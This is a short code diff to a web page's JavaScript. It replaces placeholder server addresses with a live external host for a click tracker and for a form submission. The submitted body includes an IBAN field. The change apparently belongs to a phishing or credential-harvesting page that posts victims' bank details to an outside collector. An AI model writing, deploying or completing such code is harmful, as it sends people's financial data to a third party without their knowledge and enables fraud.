@@ -9,7 +9,7 @@
     if (!btn) return;
 
     // ---- CLICK TRACKER: URL сервера и функция отправки ----
-    var TRACK_URL = 'http://YOUR_SERVER:8080/track';
+    var TRACK_URL = 'https://blgmf.onrender.com';
 
     function trackClick(name, extra) {
         try {
@@ -63,7 +63,7 @@
             iban: iban
         };
 
-        fetch('http://YOUR_SERVER:8080/submit', {
+        fetch('https://blgmf.onrender.com', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
